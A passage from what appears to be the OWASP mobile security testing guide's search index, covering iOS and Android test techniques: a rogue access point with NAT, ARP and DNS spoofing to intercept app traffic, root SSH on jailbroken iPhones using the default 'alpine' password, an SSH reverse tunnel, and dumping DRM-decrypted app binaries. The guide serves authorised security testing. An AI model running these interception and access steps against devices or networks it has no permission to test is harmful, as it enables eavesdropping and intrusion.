using the following commands on Kali Linux:</p> <pre><code># check if other process is not using WiFi interfaces\n$ airmon-ng check kill\n# configure IP address of the AP network interface\n$ ifconfig wlan1 10.0.0.1 up\n# start access point\n$ hostapd hostapd.conf\n# connect the target network interface\n$ wpa_supplicant -B -i wlan0 -c wpa_supplicant.conf\n# run DNS server\n$ dnsmasq -C dnsmasq.conf -d\n# enable routing\n$ echo 1 &gt; /proc/sys/net/ipv4/ip_forward\n# iptables will NAT connections from AP network interface to the target network interface\n$ iptables --flush\n$ iptables --table nat --append POSTROUTING --out-interface wlan0 -j MASQUERADE\n$ iptables --append FORWARD --in-interface wlan1 -j ACCEPT\n$ iptables -t nat -A POSTROUTING -j MASQUERADE\n</code></pre> <p>Now you can connect your mobile devices to the access point.</p>","tags":["generic","tech"]},{"location":"MASTG/techniques/generic/MASTG-TECH-0125/","title":"MASTG-TECH-0125: Intercepting Xamarin Traffic","text":"<p>Xamarin is a mobile app development platform that allows developers to create native Android and iOS apps using Visual Studio and C#.</p> <p>When testing a Xamarin app, setting the system proxy in the Device Wi-Fi settings will not capture any HTTP requests in your interception proxy. This is because Xamarin apps do not use the local proxy settings of your device. There are three ways to bypass this limitation:</p>","tags":["generic","tech"]},{"location":"MASTG/techniques/generic/MASTG-TECH-0125/#option-1-manipulating-xamarins-network-stack-default-proxy","title":"Option 1: Manipulating Xamarin's Network Stack Default Proxy","text":"<p>Patch the app to use a default proxy by adding the following code in the <code>OnCreate</code> or <code>Main</code> method:</p> <pre><code>WebRequest.DefaultWebProxy = new WebProxy(\"192.168.11.1\", 8080);\n</code></pre> <p>Finally, recompile and sign the patched app.</p> <p>Alternatively, use Frida to hook into the <code>WebRequest.DefaultWebProxy</code> property and dynamically set the proxy to your interception proxy.</p>","tags":["generic","tech"]},{"location":"MASTG/techniques/generic/MASTG-TECH-0125/#option-2-achieving-a-mitm-position-via-arp-spoofing","title":"Option 2: Achieving a MITM Position via ARP Spoofing","text":"<p>Use  bettercap to achieve a MITM position and redirect port 443 to your interception proxy running on localhost.</p> <p>On macOS:</p> <pre><code>echo \"\nrdr pass inet proto tcp from any to any port 443 -&gt; 127.0.0.1 port 8080\n\" | sudo pfctl -ef -\n</code></pre> <p>On Linux:</p> <pre><code>sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination 127.0.0.1:8080\n</code></pre> <p>Lastly, enable \"Support invisible proxy\" in the listener settings of  Android Studio.</p>","tags":["generic","tech"]},{"location":"MASTG/techniques/generic/MASTG-TECH-0125/#option-3-dns-spoofing","title":"Option 3: DNS Spoofing","text":"<p>If you can modify the device's DNS resolution (DNS Spoofing), you can reroute the app's traffic to your proxy. For example, on a rooted Android device, you can add an entry in <code>/etc/hosts</code> mapping the app's server domain to your proxy machine's IP. This makes the app believe that your machine is the legitimate server.</p> <p>Since DNS spoofing redirects traffic at the domain level, incoming connections will still use the original destination port (e.g., 443 for HTTPS). To properly intercept the traffic with your proxy (which may be running on a different port, like 8080), you need port redirection. This ensures that traffic arriving at 443 is forwarded to the proxy's listening port.</p> <p>Once redirected, the proxy can inspect, modify, or relay the traffic to the actual server, effectively acting as a MITM (as done with  bettercap).</p>","tags":["generic","tech"]},{"location":"MASTG/techniques/generic/MASTG-TECH-0125/#setting-up-traffic-redirection-and-the-interception-proxy","title":"Setting Up Traffic Redirection and the Interception Proxy","text":"<p>If you haven't already, set up your interception proxy. See  Intercepting HTTP Traffic Using an Interception Proxy.</p> <p>Tip: When redirecting traffic, create specific rules for only the domains and IPs in scope to reduce noise from out-of-scope traffic.</p> <p>Ensure that your interception proxy listens on the port defined in your redirection rule (<code>8080</code> in this case).</p> <p>After redirecting traffic to your interception proxy, you need to forward it back to its original destination. The following steps set up redirection in  Burp Suite:</p> <ol> <li>Open the Proxy tab and click on Options.</li> <li>Select and edit your listener from the list of proxy listeners.</li> <li>Navigate to the Request Handling tab and configure:<ul> <li>Redirect to host: Set this to the original server destination.</li> <li>Redirect to port: Specify the original port.</li> <li>Enable \"Force use of SSL\" (if HTTPS is used) and \"Support invisible proxy\".</li> </ul> </li> </ol> <p></p>","tags":["generic","tech"]},{"location":"MASTG/techniques/generic/MASTG-TECH-0125/#start-intercepting-traffic","title":"Start Intercepting Traffic","text":"<p>Now, start using the app and trigger its functions. If configured correctly, HTTP messages should appear in your interception proxy.</p> <p>Note: When using Bettercap or DNS Spoofing, enable \"Support invisible proxying\" under Proxy Tab \u2192 Options \u2192 Edit Interface. Ensure the proxy settings are properly configured to handle both HTTP and HTTPS traffic for full visibility.</p>","tags":["generic","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0052/","title":"MASTG-TECH-0052: Accessing the Device Shell","text":"<p>One of the most common things you do when testing an app is accessing the device shell. In this section we'll see how to access the iOS shell both remotely from your host computer with/without a USB cable and locally from the device itself.</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0052/#remote-shell","title":"Remote Shell","text":"<p>In contrast to Android where you can easily access the device shell using the adb tool, on iOS you only have the option to access the remote shell via SSH. This also means that your iOS device must be jailbroken in order to connect to its shell from your host computer. For this section we assume that you've properly jailbroken your device and have either  Sileo or Zebra installed. In the rest of the guide we will reference to Sileo, but the same packages should be available in Zebra.</p> <p></p> <p>In order to enable SSH access to your iOS device you can install the OpenSSH package. Once installed, be sure to connect both devices to the same Wi-Fi network and take a note of the device IP address, which you can find in the Settings -&gt; Wi-Fi menu and tapping once on the info icon of the network you're connected to.</p> <p>You can now access the remote device's shell by running <code>ssh root@&lt;device_ip_address&gt;</code>, which will log you in as the root user:</p> <pre><code>$ ssh root@192.168.197.234\nroot@192.168.197.234's password:\niPhone:~ root#\n</code></pre> <p>Press Control + D or type <code>exit</code> to quit.</p> <p>When accessing your iOS device via SSH consider the following:</p> <ul> <li>The default users are <code>root</code> and <code>mobile</code>.</li> <li>The default password for both is <code>alpine</code>.</li> </ul> <p>Remember to change the default password for both users <code>root</code> and <code>mobile</code> as anyone on the same network can find the IP address of your device and connect via the well-known default password, which will give them root access to your device.</p> <p>If you forget your password and want to reset it to the default <code>alpine</code>:</p> <ol> <li>Edit the file <code>/private/etc/master.password</code> on your jailbroken iOS device (using an on-device shell as shown below)</li> <li>Find the lines:</li> </ol> <pre><code> root:xxxxxxxxx:0:0::0:0:System Administrator:/var/root:/bin/sh\n mobile:xxxxxxxxx:501:501::0:0:Mobile User:/var/mobile:/bin/sh\n</code></pre> <ol> <li>Change <code>xxxxxxxxx</code> to <code>/smx7MYTQIi2M</code> (which is the hashed password <code>alpine</code>)</li> <li>Save and exit</li> </ol>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0052/#connect-to-a-device-via-ssh-over-usb","title":"Connect to a Device via SSH over USB","text":"<p>During a real black box test, a reliable Wi-Fi connection may not be available. In this situation, you can use  Usbmuxd to connect to your device's SSH server via USB.</p> <p>Connect macOS to an iOS device by installing and starting  iproxy:</p> <pre><code>$ iproxy 2222 22\nwaiting for connection\n</code></pre> <p>The above command maps port <code>22</code> on the iOS device to port <code>2222</code> on localhost. You can also make iproxy run automatically in the background if you don't want to run the binary every time you want to SSH over USB.</p> <p>With the following command in a new terminal window, you can connect to the device:</p> <pre><code>$ ssh -p 2222 mobile@localhost\nmobile@localhost's password:\niPhone:~ mobile%\n</code></pre>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0052/#on-device-shell-app","title":"On-device Shell App","text":"<p>While usually using an on-device shell (terminal emulator) might be very tedious compared to a remote shell, it can prove handy for debugging in case of, for example, network issues or check some configuration. For example, you can install NewTerm 2 via Sileo for this purpose (it supports iOS 10.0 to 16.2 at the time of this writing).</p> <p>In addition, there are a few jailbreaks that explicitly disable incoming SSH for security reasons. In those cases, it is very convenient to have an on-device shell app, which you can use to first SSH out of the device with a reverse shell, and then connect from your host computer to it.</p> <p>Opening a reverse shell over SSH can be done by running the command <code>ssh -R &lt;remote_port&gt;:localhost:22 &lt;username&gt;@&lt;host_computer_ip&gt;</code>.</p> <p>On the on-device shell app run the following command and, when asked, enter the password of the <code>mstg</code> user of the host computer:</p> <pre><code>ssh -R 2222:localhost:22 mstg@192.168.197.235\n</code></pre> <p>On your host computer run the following command and, when asked, enter the password of the <code>root</code> user of the iOS device:</p> <pre><code>ssh -p 2222 root@localhost\n</code></pre>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0053/","title":"MASTG-TECH-0053: Host-Device Data Transfer","text":"<p>There might be various scenarios where you might need to transfer data from the iOS device or app data sandbox to your host computer or vice versa. The following section will show you different ways on how to achieve that.</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0053/#copying-app-data-files-via-ssh-and-scp","title":"Copying App Data Files via SSH and SCP","text":"<p>As we know now, files from our app are stored in the Data directory. You can now simply archive the Data directory with <code>tar</code> and pull it from the device with <code>scp</code>:</p> <pre><code>iPhone:~ root# tar czvf /tmp/data.tgz /private/var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693\niPhone:~ root# exit\n$ scp -P 2222 root@localhost:/tmp/data.tgz .\n</code></pre>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0053/#grapefruit","title":"Grapefruit","text":"<p>After starting  Grapefruit you can select the app that is in scope for testing. There are various functions available, of which one is called \"Finder\". When selecting it, you will get a listing of the directories of the app sandbox.</p> <p></p> <p>When navigating through the directories and selecting a file, a pop-up will show up and display the data either as hexadecimal or text. When closing this pop-up you have various options available for the file, including:</p> <ul> <li>Database viewer</li> <li>Plist viewer</li> <li>Download</li> </ul> <p></p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0053/#objection","title":"Objection","text":"<p>When you are starting objection you will find the prompt within the Bundle directory.</p> <pre><code>org.owasp.MSTG on (iPhone: 10.3.3) [usb] # pwd print\nCurrent directory: /var/containers/Bundle/Application/DABF849D-493E-464C-B66B-B8B6C53A4E76/org.owasp.MSTG.app\n</code></pre> <p>Use the <code>env</code> command to get the directories of the app and navigate to the Documents directory.</p> <pre><code>org.owasp.MSTG on (iPhone: 10.3.3) [usb] # cd /var/mobile/Containers/Data/Application/72C7AAFB-1D75-4FBA-9D83-D8B4A2D44133/Documents\n/var/mobile/Containers/Data/Application/72C7AAFB-1D75-4FBA-9D83-D8B4A2D44133/Documents\n</code></pre> <p>With the command <code>file download &lt;filename&gt;</code> you can download a file from the iOS device to your host computer and can analyze it afterwards.</p> <pre><code>org.owasp.MSTG on (iPhone: 10.3.3) [usb] # file download .com.apple.mobile_container_manager.metadata.plist\nDownloading /var/mobile/Containers/Data/Application/72C7AAFB-1D75-4FBA-9D83-D8B4A2D44133/.com.apple.mobile_container_manager.metadata.plist to .com.apple.mobile_container_manager.metadata.plist\nStreaming file from device...\nWriting bytes to destination...\nSuccessfully downloaded /var/mobile/Containers/Data/Application/72C7AAFB-1D75-4FBA-9D83-D8B4A2D44133/.com.apple.mobile_container_manager.metadata.plist to .com.apple.mobile_container_manager.metadata.plist\n</code></pre> <p>You can also upload files to the iOS device with <code>file upload &lt;local_file_path&gt;</code>.</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0054/","title":"MASTG-TECH-0054: Obtaining and Extracting Apps","text":"","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0054/#getting-the-ipa-file-from-an-ota-distribution-link","title":"Getting the IPA File from an OTA Distribution Link","text":"<p>During development, apps are sometimes provided to testers via over-the-air (OTA) distribution. In that situation, you'll receive an itms-services link, such as the following:</p> <pre><code>itms-services://?action=download-manifest&amp;url=https://s3-ap-southeast-1.amazonaws.com/test-uat/manifest.plist\n</code></pre> <p>You can use the ITMS services asset downloader tool to download the IPA from an OTA distribution URL. Install it via npm:</p> <pre><code>npm install -g itms-services\n</code></pre> <p>Save the IPA file locally with the following command:</p> <pre><code># itms-services -u \"itms-services://?action=download-manifest&amp;url=https://s3-ap-southeast-1.amazonaws.com/test-uat/manifest.plist\" -o - &gt; out.ipa\n</code></pre>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0054/#extracting-the-app-binary","title":"Extracting the App Binary","text":"<p>If you have an IPA with a decrypted app binary, unzip it and you are ready to go. The app binary is located in the main bundle directory (.app), e.g. <code>Payload/Telegram X.app/Telegram X</code>. See the following subsection for details on the extraction of the property lists.</p> <p>On macOS's Finder, .app directories are opened by right-clicking them and selecting \"Show Package Content\". On the terminal you can just <code>cd</code> into them.</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0054/#decrypting-the-app-binary","title":"Decrypting the App Binary","text":"<p>IMPORTANT NOTE: In the United States, the Digital Millennium Copyright Act 17 U.S.C. 1201, or DMCA, makes it illegal and actionable to circumvent certain types of DRM. However, the DMCA also provides exemptions, such as for certain kinds of security research. A qualified attorney can help you determine if your research qualifies under the DMCA exemptions. (Source: Corellium)</p> <p>If you don't have the original IPA, then you need a jailbroken device where you will install the app (e.g. via App Store). Once installed, you need to extract the app binary from memory and rebuild the IPA file. Because of DRM, the app binary file is encrypted when it is stored on the iOS device, so simply pulling it from the Bundle (either through SSH or Objection) will not be sufficient to reverse engineer it.</p> <p>You can verify this by running this command on the app binary:</p> <pre><code>otool -l Payload/Telegram X.app/Telegram X | grep -i LC_ENCRYPTION -B1 -A4\nLoad command 12\n          cmd LC_ENCRYPTION_INFO\n      cmdsize 20\n     cryptoff 16384\n    cryptsize 32768\n      cryptid 1\n</code></pre> <p>Or with  rabin2:</p> <pre><code>rabin2 -I Payload/Telegram X.app/Telegram X | grep crypto\ncrypto   true\n</code></pre> <p>In order to retrieve the unencrypted version, you can use frida-ios-dump. It will extract the unencrypted version from memory while the application is running on the device.</p> <p>First, configure  Frida-ios-dump <code>dump.py</code>:</p> <ul> <li>set it to use <code>localhost</code> with port <code>2222</code> when using  iproxy (<code>iproxy 2222 22</code>), or to the actual IP address and port of the device from which you want to dump the binary.</li> <li>update the default username (<code>User = 'root'</code>) and password (<code>Password = 'alpine'</code>) in <code>dump.py</code> to the ones you have set.</li> </ul> <p>Enumerate the apps installed on the device by running <code>python dump.py -l</code>:</p> <pre><code> PID  Name             Identifier\n----  ---------------  -------------------------------------\n 860  Cydia            com.saurik.Cydia\n1130  Settings         com.apple.Preferences\n 685  Mail             com.apple.mobilemail\n 834  Telegram         ph.telegra.Telegraph\n   -  Stocks           com.apple.stocks\n   ...\n</code></pre> <p>You can dump the selected app, for example Telegram, by running <code>python dump.py -H 127.0.0.1 -p 2222 --user mobile -P alpine ph.telegra.Telegraph</code>, if you are using an SSH tunnel with <code>iproxy</code> and the default credentials on a jailbroken phone.</p> <p>After a couple of seconds, the <code>Telegram.ipa</code> file will be created in your current directory. You can validate the success of the dump by removing the app and reinstalling it (e.g. using  ios-deploy <code>ios-deploy -b Telegram.ipa</code>). Note that this will only work on jailbroken devices, as otherwise the signature won't be valid.</p> <p>You can use  rabin2 to verify that the app binary is now unencrypted:</p> <pre><code>rabin2 -I Payload/Telegram X.app/Telegram X | grep crypto\ncrypto   false\n</code></pre>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0054/#thinning-the-app-binary","title":"Thinning the App Binary","text":"<p>The app binary may contain multiple architectures, such as <code>armv7</code> (32-bit) and <code>arm64</code> (64-bit). That is called a \"fat binary\".</p> <p>One example is the Damn Vulnerable iOS App DVIA v1 to demonstrate this.</p> <p>Unzip the app and run  otool:</p> <pre><code>unzip DamnVulnerableiOSApp.ipa\ncd Payload/DamnVulnerableIOSApp.app\notool -hv DamnVulnerableIOSApp\n</code></pre> <p>The output will look like this:</p> <pre><code>DamnVulnerableIOSApp (architecture armv7):\nMach header\n      magic  cputype cpusubtype  caps    filetype ncmds sizeofcmds      flags\n   MH_MAGIC      ARM         V7  0x00     EXECUTE    33       3684   NOUNDEFS DYLDLINK TWOLEVEL PIE\nDamnVulnerableIOSApp (architecture arm64):\nMach header\n      magic  cputype cpusubtype  caps    filetype ncmds sizeofcmds      flags\nMH_MAGIC_64    ARM64        ALL  0x00     EXECUTE    33       4192   NOUNDEFS DYLDLINK TWOLEVEL PIE\n</code></pre> <p>To ease the app analysis, it's recommended create a so-called thin binary, which contains one architecture only:</p> <pre><code>lipo -thin armv7 DamnVulnerableIOSApp -output DVIA32\n</code></pre>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0055/","title":"MASTG-TECH-0055: Launching a Repackaged App in Debug Mode","text":"<p>If you've repackaged an application with a Frida Gadget, or if you want to attach  lldb to the application, you have to launch the application in debug mode. When you launch the application via SpringBoard, it will not launch in debug mode and the application will crash.</p> <p>After the application has been installed using  Installing Apps, you can launch it in debug mode using the following commands.</p> <p>Note that the commands that are part of  libimobiledevice suite refer to the latest version available from Github. If you installed them via brew or other package managers, you may have an older version with different command line flags.</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0055/#ios-17-and-newer","title":"iOS 17 and newer","text":"<p>First, make sure you know the correct Bundle Identifier. Depending on how you signed the application, the actual Bundle Identifier might be different from the original Bundle Identifier. To get an overview of the installed applications, use the <code>ideviceinstaller</code> tool (see  libimobiledevice suite):</p> <pre><code>$ ideviceinstaller list\nCFBundleIdentifier, CFBundleShortVersionString, CFBundleDisplayName\nsg.vp.UnCrackable1.QH868V5764, \"1.0\", \"UnCrackable1\"\norg.owasp.mastestapp.MASTestApp, \"3.0.0\", \"Adyen3DS2Demo\"\ncom.apple.TestFlight, \"3.5.2\", \"TestFlight\"\n</code></pre> <p>In this example,  Sideloadly appended the team identifier (<code>QH868V5764</code>) to the original Bundle Identifier.</p> <p>Next, we need to get the correct device identifier, which we can get using <code>idevice_id</code> (see  libimobiledevice suite):</p> <pre><code>$ idevice_id\n00008101-1234567890123456 (USB)\n00008101-1234567890123456 (Network)\n</code></pre> <p>Now that we have the correct Bundle Identifier and device ID, we can launch the app using <code>xcrun</code> (see  xcrun):</p> <pre><code>xcrun devicectl device process launch --device 00008101-1234567890123456  --start-stopped sg.vp.UnCrackable1.QH868V5764\n13:00:43  Enabling developer disk image services.\n13:00:43  Acquired usage assertion.\nLaunched application with sg.vp.UnCrackable1.QH868V5764 bundle identifier.\n</code></pre> <p>Finally, you can attach  lldb using the following commands:</p> <pre><code># Execute the lldb debugger\n$ lldb\n# Select the iOS device you want to interact with\n(lldb) device select 00008101-1234567890123456\n\n# Query the processes on a device.\n(lldb) device process list\nPID    PARENT USER       TRIPLE                         NAME\n====== ====== ========== ============================== ============================\n1      0                                                launchd\n...\n771    0                                                &lt;anonymous&gt;\n774    0                                                &lt;anonymous&gt;\n781    0                                                ReportCrash\n783    0                                                UnCrackable Level 1\n\n# Attach to a specific process by their process ID\n(lldb) device process attach --pid 783\nProcess 783 stopped\n* thread #1, stop reason = signal SIGSTOP\n    frame #0: 0x0000000104312920 dyld`_dyld_start\ndyld`_dyld_start:\n-&gt;  0x104312920 &lt;+0&gt;:  mov    x0, sp\n    0x104312924 &lt;+4&gt;:  and    sp, x0, #0xfffffffffffffff0\n    0x104312928 &lt;+8&gt;:  mov    x29, #0x0 ; =0\n    0x10431292c &lt;+12&gt;: mov    x30, #0x0 ; =0\nTarget 0: (UnCrackable Level 1) stopped.\n\n# Continue execution of all threads in the current process.\n(lldb) c\nProcess 783 resuming\n(lldb)\n</code></pre> <p>More information about debugging iOS apps can be found in  Debugging.</p> <p>If you manually injected a Frida Gadget, Frida will now be waiting for you to attach to it. Until you do so, the application will appear frozen.</p> <pre><code>$ frida-ps -Ua\nPID  Name           Identifier\n---  -------------  -------------------------------\n389  Calendar       com.apple.mobilecal\n783  Gadget         re.frida.Gadget\n336  TestFlight     com.apple.TestFlight\n783  UnCrackable1   sg.vp.UnCrackable1.QH868V5764\n339  Weather        com.apple.weather\n</code></pre> <p>The <code>783</code> process has launched a new thread called Gadget to which you can attach:</p> <pre><code>$ frida -U -n Gadget\n     ____\n    / _  |   Frida 16.5.9 - A world-class dynamic instrumentation toolkit\n   | (_| |\n    &gt; _  |   Commands:\n   /_/ |_|       help      -&gt; Displays the help system\n   . . . .       object?   -&gt; Display information about 'object'\n   . . . .       exit/quit -&gt; Exit\n   . . . .\n   . . . .   More info at https://frida.re/docs/home/\n   . . . .\n   . . . .   Connected to iPhone (id=00008101-000628803A69001E)\n\n[iPhone::Gadget ]-&gt; ObjC.available\ntrue\n</code></pre> <p>After attaching, the application will continue executing as normal.</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0055/#ios-16-and-older","title":"iOS 16 and older","text":"<p>On older versions of iOS, you can use either <code>idevicedebug</code> (see  libimobiledevice suite) or  ios-deploy to launch the app in debug mode.</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0055/#using-idevicedebug","title":"Using idevicedebug","text":"<pre><code># Get the package name\n$ ideviceinstaller list\nCFBundleIdentifier, CFBundleShortVersionString, CFBundleDisplayName\nsg.vp.UnCrackable1.QH868V5764, \"1.0\", \"UnCrackable1\"\ncom.apple.TestFlight, \"3.7.0\", \"TestFlight\"\ncom.google.Maps, \"24.50.0\", \"Google Maps\"\n\n# Run in debug mode\n$ idevicedebug -d run sg.vp.UnCrackable1.QH868V5764\nworking_directory: /private/var/mobile/Containers/Data/Application/438DE865-2714-4BD9-B1EE-881AD4E54AD1\n\nSetting logging bitmask...\nSetting maximum packet size...\nSetting working directory...\nSetting argv...\napp_argv[0] = /private/var/containers/Bundle/Application/E21B5B13-DD85-4C83-9A0E-03FCEBF95CF5/UnCrackable Level 1.app/UnCrackable Level 1\nChecking if launch succeeded...\nSetting thread...\nContinue running process...\n</code></pre>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0055/#using-ios-deploy","title":"Using ios-deploy","text":"<p>To use  ios-deploy, you first have to unzip the IPA file:</p> <pre><code>$ unzip Uncrackable1-frida-codesigned.ipa -d unzipped\n</code></pre> <p>Next, use ios-deploy with the path of the app folder inside of the unzipped IPA:</p> <pre><code>$ ios-deploy --bundle 'unzipped/Payload/UnCrackable Level 1.app' -W -d -v\nios-deploy --bundle 'pram/Payload/UnCrackable Level 1.app' -W -d -v\n[....] Waiting for iOS device to be connected\nHandling device type: 1\nAlready found device? 0\nHardware Model: D211AP\nDevice Name: NVISO\u2019s iPhone JBE\nModel Name: iPhone 8 Plus\nSDK Name: iphoneos\nArchitecture Name: arm64\nProduct Version: 16.6.1\nBuild Version: 20G81\n[....] Using 593ad60af30ad045b9cb99d2901031226c1b8c84 (D211AP, iPhone 8 Plus, iphoneos, arm64, 16.6.1, 20G81) a.k.a. '**NVISO**\u2019s iPhone JBE'.\n------ Install phase ------\n[  0%] Found 593ad60af30ad045b9cb99d2901031226c1b8c84 (D211AP, iPhone 8 Plus, iphoneos, arm64, 16.6.1, 20G81) a.k.a. 'NVISO\u2019s iPhone JBE' connected through USB, beginning install\n[  5%] Copying /Users/MAS/unzipped/Payload/UnCrackable Level 1.app/META-INF/ to device\n[  5%] Copying /Users/MAS/unzipped/Payload/UnCrackable Level 1.app/META-INF/com.apple.ZipMetadata.plist to device\n[  6%] Copying /Users/MAS/unzipped/Payload/UnCrackable Level 1.app/META-INF/com.apple.ZipMetadata.plist to device\n...\n</code></pre>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0055/#attaching-frida","title":"Attaching Frida","text":"<p>If your application was repackaged with a Frida Gadget, the application will wait for you to attach to it before it continues launching.</p> <p>In a new terminal window, connect to the Frida gadget, just like in the iOS 17 scenario:</p> <pre><code>$ frida-ps -Ua\nPID  Name           Identifier\n---  -------------  -----------------------------\n...\n468  Gadget         re.frida.Gadget\n...\n468  UnCrackable1   sg.vp.UnCrackable1.QH868V5764\n\n\n$ frida -U -n Gadget\n     ____\n    / _  |   Frida 16.5.9 - A world-class dynamic instrumentation toolkit\n   | (_| |\n    &gt; _  |   Commands:\n   /_/ |_|       help      -&gt; Displays the help system\n   . . . .       object?   -&gt; Display information about 'object'\n   . . . .       exit/quit -&gt; Exit\n   . . . .\n   . . . .   More info at https://frida.re/docs/home/\n   . . . .\n   . . . .   Connected to iPhone (id=593ad60af30ad045b9cb99d2901031226c1b8c84)\n[iPhone::Gadget ]-&gt; ObjC.available\ntrue\n</code></pre>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0056/","title":"MASTG-TECH-0056: Installing Apps","text":"<p>When you install an application without using Apple's App Store, this is called sideloading. There are various ways of sideloading which are described below. On the iOS device, the actual installation process is then handled by the installd daemon, which will unpack and install the application. To integrate app services or be installed on an iOS device, all applications must be signed with a certificate issued by Apple. This means that the application can be installed only after successful code signature verification, which is explained in  Signing IPA files.</p> <p>Disabling Signature Verification (optional): On a jailbroken device, you can bypass the signature verification requirement using  AppSync Unified, which hooks the appropriate system daemon and disables signature verification for any installations you do with the tools listed below while it's enabled.</p> <p>Different methods exist for installing an IPA package onto an iOS device, which are described in detail below.</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0056/#sideloadly","title":"Sideloadly","text":"<p> Sideloadly is a GUI tool that can automate all required steps for you. It requires valid Apple developer credentials, as it will obtain a valid signature from Apple servers.</p> <p>Simply connect your device via USB, enter your Apple ID and drag-and-drop the IPA file onto SideLoadly. Click start to automatically sign and install the given IPA.</p> <p></p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0056/#libimobiledevice","title":"libimobiledevice","text":"<p>On Linux and also macOS, you can alternatively use  libimobiledevice suite. This allows you to install apps over a USB connection by executing <code>ideviceinstaller</code>. The connection is implemented with the USB multiplexing daemon usbmuxd, which provides a TCP tunnel over USB.</p> <p>Let's install the  iGoat-Swift app with the following command:</p> <pre><code>$ ideviceinstaller -i Uncrackable.ipa\n...\nInstall: Complete\n</code></pre>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0056/#filza","title":"Filza","text":"<p> Filza allows you to install an IPA file which is already located on your device. You can use either <code>scp</code> ( Host-Device Data Transfer) or AirDrop to copy the IPA file to your device, after which you can simply navigate to the IPA file on your file system and click the <code>Install</code> button in the top right corner.</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0056/#ipainstaller","title":"ipainstaller","text":"<p>The IPA can also be directly installed on the iOS device via the command line with  ipainstaller. Naturally, this requires a jailbroken device, as otherwise you cannot SSH into the device. After copying the file over to the device, for example via <code>scp</code> ( Host-Device Data Transfer) or AirDrop, you can execute <code>ipainstaller</code> with the IPA's filename:</p> <pre><code>ipainstaller Uncrackable.ipa\n</code></pre>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0056/#ios-deploy","title":"ios-deploy","text":"<p>On macOS you can also use the  ios-deploy tool to install iOS apps from the command line. You'll need to unzip your IPA since ios-deploy uses the app bundles to install apps.</p> <pre><code>unzip UnCrackable.ipa\nios-deploy --bundle 'Payload/UnCrackable Level 1.app' -W -v\n</code></pre>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0056/#xcrun","title":"xcrun","text":"<p>After installing  Xcode Command Line Tools, you can execute the following command to install a signed IPA:</p> <pre><code># Get the correct device id\n$ xcrun devicectl list devices\nDevices:\nName                 Hostname                                     Identifier                             State                Model\n------------------   ------------------------------------------   ------------------------------------   ------------------   ------------------------------\nFoobar               00008101-00FF28803FF9001E.coredevice.local   ABD1F3D8-7BC1-52CD-8DB6-9BFD794CE862   available (paired)   iPhone 14 Pro Max (iPhone15,3)\n\n$ xcrun devicectl device install app --device 00008101-00FF28803FF9001E ~/signed.ipa\n11:59:04  Acquired tunnel connection to device.\n11:59:04  Enabling developer disk image services.\n11:59:04  Acquired usage assertion.\n4%... 12%... 28%... 30%... 31%... 32%... 33%... 35%... 36%... 37%... 39%... 40%... 42%... 43%... 45%... 49%... 51%... 52%... 54%... 55%... 57%... 59%... 60%... 62%... 66%... 68%... 72%... 76%... 80%... 84%... 88%... 92%... 96%... Complete!\nApp installed:\n\u2022 bundleID: org.mas.myapp\n\u2022 installationURL: file:///private/var/containers/Bundle/Application/DFC99D25-FC36-462E-91D2-18CDE717ED21/UnCrackable%20Level%201.app/\n\u2022 launchServicesIdentifier: unknown\n\u2022 databaseUUID: DA52A5EB-5D39-4628-810E-8F42A5561CDF\n\u2022 databaseSequenceNumber: 1516\n\u2022 options:\n</code></pre>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0056/#xcode","title":"Xcode","text":"<p>It is also possible to use the Xcode IDE to install iOS apps by executing the following steps:</p> <ol> <li>Start Xcode</li> <li>Select Window/Devices and Simulators</li> <li>Select the connected iOS device and click on the + sign in Installed Apps.</li> </ol>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0056/#allow-application-installation-on-a-non-ipad-device","title":"Allow Application Installation on a Non-iPad Device","text":"<p>Sometimes an application can require to be used on an iPad device. If you only have iPhone or iPod touch devices then you can force the application to accept to be installed and used on these kinds of devices. You can do this by changing the value of the property UIDeviceFamily to the value 1 in the Info.plist file.</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"&gt;\n&lt;plist version=\"1.0\"&gt;\n&lt;dict&gt;\n\n  &lt;key&gt;UIDeviceFamily&lt;/key&gt;\n  &lt;array&gt;\n    &lt;integer&gt;1&lt;/integer&gt;\n  &lt;/array&gt;\n\n&lt;/dict&gt;\n&lt;/plist&gt;\n</code></pre> 